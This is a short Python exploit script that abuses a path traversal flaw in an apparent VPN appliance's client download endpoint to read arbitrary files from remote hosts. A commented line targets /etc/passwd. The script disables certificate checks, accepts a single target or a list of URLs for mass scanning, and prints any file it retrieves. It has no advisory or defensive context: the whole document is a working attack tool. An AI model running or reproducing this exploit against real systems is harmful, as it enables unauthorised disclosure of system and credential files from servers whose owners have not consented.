import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import http.client
import re

ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check(url,cmd):
    url = url.rstrip("/")
    #print(1)
    #target = urljoin(url, "/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd")
    target = url + "/vpn/user/download/client?ostype=../../../../../../../../.."+cmd
    #print(target)
    headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 '
                             'Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
               'Connection': 'close'
    }
    response = requests.get(url=target,  headers=headers, verify=False, timeout=15, allow_redirects=False)
    # print(1)
    # if response.status_code == 200:
    #     print("1")
    #     print(response.text)
    #     return True
    try:
        response = requests.get(url=target, verify=False, headers=headers, timeout=15, allow_redirects=False)
        # print(1)
        if response.status_code == 200:
            # print("1")
            print(response.text)
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    parser.add_argument("-c", "--cmd", help="CMD")
    args = parser.parse_args()
    url = args.url
    cmd = args.cmd
    txt = args.txt
    if url:
        check(url,cmd)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url,cmd)
    else:
        print("help")
